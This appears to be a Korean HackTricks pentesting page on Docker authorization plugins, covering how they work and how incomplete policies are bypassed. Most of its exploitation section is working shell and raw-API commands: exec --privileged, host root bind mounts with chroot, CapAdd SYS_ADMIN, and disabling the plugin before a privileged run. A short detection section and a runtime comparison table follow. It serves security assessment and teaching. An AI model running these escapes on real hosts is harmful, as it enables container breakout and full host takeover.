# 런타임 권한 부여 플러그인

{{#include ../../../banners/hacktricks-training.md}}

## 개요

런타임 권한 부여 플러그인은 호출자가 특정 daemon 동작을 수행할 수 있는지 결정하는 추가 정책 계층이다. Docker가 전형적인 예다. 기본적으로 Docker 데몬과 통신할 수 있는 누구나 사실상 데몬을 광범위하게 제어할 수 있다. 권한 부여 플러그인은 인증된 사용자와 요청된 API 작업을 검사한 다음 정책에 따라 요청을 허용하거나 거부함으로써 그 모델을 좁히려 한다.

이 주제는 Docker API에 이미 접근 권한이 있거나 `docker` 그룹의 사용자에 접근할 수 있는 상황에서 공격 모델을 변경하기 때문에 별도 페이지로 다룰 가치가 있다. 이러한 환경에서는 질문이 더 이상 단순히 "데몬에 도달할 수 있나?"가 아니라 "데몬이 권한 부여 레이어로 제한되어 있는가? 그렇다면 그 레이어가 처리되지 않은 엔드포인트, 취약한 JSON 파싱, 또는 플러그인 관리 권한을 통해 우회될 수 있는가?"가 된다.

## 동작

요청이 Docker 데몬에 도달하면 권한 부여 하위시스템은 요청 컨텍스트를 하나 이상의 설치된 플러그인으로 전달할 수 있다. 플러그인은 인증된 사용자 신원, 요청 세부정보, 선택된 헤더 및 콘텐츠 타입이 적절한 경우 요청 또는 응답 본문의 일부를 본다. 여러 플러그인을 체인으로 연결할 수 있으며, 모든 플러그인이 요청을 허용하는 경우에만 접근이 허용된다.

이 모델은 강력해 보이지만, 그 안전성은 전적으로 정책 작성자가 API를 얼마나 완전히 이해했느냐에 달려 있다. `docker run --privileged`를 차단하지만 `docker exec`를 무시하거나 최상위 `Binds`와 같은 대체 JSON 키를 놓치거나 플러그인 관리를 허용하는 플러그인은 제한이 있다는 잘못된 인식을 줄 수 있으며, 여전히 직접적인 권한 상승 경로를 열어둘 수 있다.

## 일반적인 플러그인 대상

정책 검토에서 중요한 영역은 다음과 같다:

- 컨테이너 생성 엔드포인트
- `HostConfig` 필드(예: `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, 및 네임스페이스 공유 옵션)
- `docker exec` 동작
- 플러그인 관리 엔드포인트
- 의도된 정책 모델 밖에서 런타임 동작을 간접적으로 트리거할 수 있는 모든 엔드포인트

역사적으로 Twistlock의 `authz` 플러그인과 `authobot`과 같은 간단한 교육용 플러그인들은 정책 파일과 코드 경로가 실제로 엔드포인트-대-동작 매핑을 어떻게 구현했는지를 보여주었기 때문에 이 모델을 연구하기 쉬웠다. 평가 작업에서는 중요한 교훈이 정책 작성자가 가장 눈에 띄는 CLI 명령뿐만 아니라 전체 API 표면을 이해해야 한다는 것이다.

## 악용

첫 번째 목표는 실제로 무엇이 차단되는지를 파악하는 것이다. 데몬이 동작을 거부하면, 오류는 종종 플러그인 이름을 leaks 하며 이는 사용 중인 제어를 식별하는 데 도움이 된다:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
광범위한 엔드포인트 프로파일링이 필요하다면, `docker_auth_profiler` 같은 도구가 유용합니다. 해당 도구는 플러그인이 실제로 허용하는 API 경로와 JSON 구조를 확인하는 반복적인 작업을 자동화해주기 때문입니다.

환경이 커스텀 플러그인을 사용하고 있고 API와 상호작용할 수 있다면, 실제로 필터링되는 객체 필드를 열거하세요:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
이러한 검사들은 중요하다. 많은 권한 부여 실패는 개념별이라기보다 필드(속성)별로 발생하기 때문이다. 플러그인은 CLI 패턴을 거부할 수 있지만 동등한 API 구조를 완전히 차단하지 못할 수 있다.

### 전체 예제: `docker exec`가 컨테이너 생성 후 권한을 추가함

특권 컨테이너 생성을 차단하지만 unconfined 컨테이너 생성과 `docker exec`를 허용하는 정책은 여전히 우회될 수 있다:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
만약 daemon이 두 번째 단계를 수락하면, 사용자는 정책 작성자가 제약되었다고 믿은 컨테이너 내부에서 권한 있는 대화형 프로세스를 되찾게 됩니다.

### Full Example: Bind Mount Through Raw API

일부 잘못된 정책은 단 하나의 JSON 형태만 검사합니다. root filesystem bind mount이 일관되게 차단되지 않으면, 호스트가 여전히 마운트될 수 있습니다:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
동일한 아이디어는 `HostConfig` 아래에도 나타날 수 있습니다:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
영향은 호스트 전체 파일 시스템 탈출입니다. 흥미로운 점은 이 우회가 커널 버그 때문이 아니라 불완전한 정책 적용으로 인해 발생한다는 것입니다.

### Full Example: Unchecked Capability Attribute

정책이 capability 관련 속성을 필터링하는 것을 잊으면, 공격자는 위험한 capability를 회복하는 container를 생성할 수 있습니다:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
일단 `CAP_SYS_ADMIN` 또는 이와 유사하게 강한 capability가 존재하면, [capabilities.md](protections/capabilities.md)와 [privileged-containers.md](privileged-containers.md)에 설명된 많은 breakout techniques에 접근할 수 있게 됩니다.

### 전체 예: 플러그인 비활성화

plugin-management 작업이 허용된다면, 가장 깔끔한 bypass는 해당 제어를 완전히 끄는 것입니다:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
이것은 컨트롤 플레인 수준의 정책 실패입니다. 인가 레이어는 존재하지만, 제한하려던 사용자가 이를 비활성화할 수 있는 권한을 여전히 보유하고 있습니다.

## 검사

이 명령들은 정책 레이어가 존재하는지, 그리고 그것이 완전한지 아니면 피상적인지 확인하는 데 목적이 있습니다.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
What is interesting here:

- 플러그인 이름을 포함한 거부 메시지는 권한 부여 계층의 존재를 확인해 주며 종종 정확한 구현을 드러냅니다.
- 공격자에게 보이는 플러그인 목록만으로도 비활성화 또는 재구성(reconfigure) 작업이 가능한지 판단하기에 충분할 수 있습니다.
- 명백한 CLI 동작만 차단하고 raw API 요청은 차단하지 않는 정책은 달리 증명되지 않는 한 우회 가능(bypassable)한 것으로 간주해야 합니다.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Not enabled by default | authorization plugin이 구성되지 않으면 daemon 접근은 사실상 all-or-nothing입니다 | 불완전한 플러그인 정책, allowlists 대신 blacklists 사용, 플러그인 관리 허용, 필드 수준의 맹점 |
| Podman | Not a common direct equivalent | Podman은 일반적으로 Docker-style authz plugins보다 Unix 권한, rootless 실행, API 노출 결정에 더 의존합니다 | root 권한의 Podman API를 광범위하게 노출, 약한 소켓 권한 |
| containerd / CRI-O | Different control model | 이러한 런타임은 보통 Docker authz plugins 대신 소켓 권한, 노드 신뢰 경계(node trust boundaries), 상위 계층 오케스트레이터 제어에 의존합니다 | 워크로드에 소켓을 마운트, 약한 노드 로컬 신뢰 가정 |
| Kubernetes | Uses authn/authz at the API-server and kubelet layers, not Docker authz plugins | Cluster RBAC와 admission controls가 주요 정책 계층입니다 | 과도하게 넓은 RBAC, 약한 admission 정책, kubelet 또는 runtime APIs를 직접 노출 |
{{#include ../../../banners/hacktricks-training.md}}
